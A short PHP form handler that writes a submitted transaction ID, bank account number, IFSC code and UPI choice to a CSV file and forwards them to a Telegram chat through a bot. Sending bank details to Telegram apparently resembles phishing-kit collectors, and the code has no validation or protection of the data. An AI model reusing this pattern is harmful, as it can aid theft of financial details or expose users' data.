<?php
include "config.php";

$txn_id       = $_POST['txn_id'];
$account_no   = $_POST['account_no'];
$ifsc_code    = $_POST['ifsc_code'];
$selected_upi = $_POST['selected_upi'];

$time = date("Y-m-d H:i:s");

// Save to CSV
$line = [$txn_id, $account_no, $ifsc_code, $selected_upi, $time];
$f = fopen($csv_file, 'a');
fputcsv($f, $line);
fclose($f);

// Send Telegram
$message = "New Submission:\nTxn ID: $txn_id\nAccount: $account_no\nIFSC: $ifsc_code\nSelected UPI: $selected_upi\nTime: $time";
$url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message);
file_get_contents($url);

echo "Submitted successfully!";
?>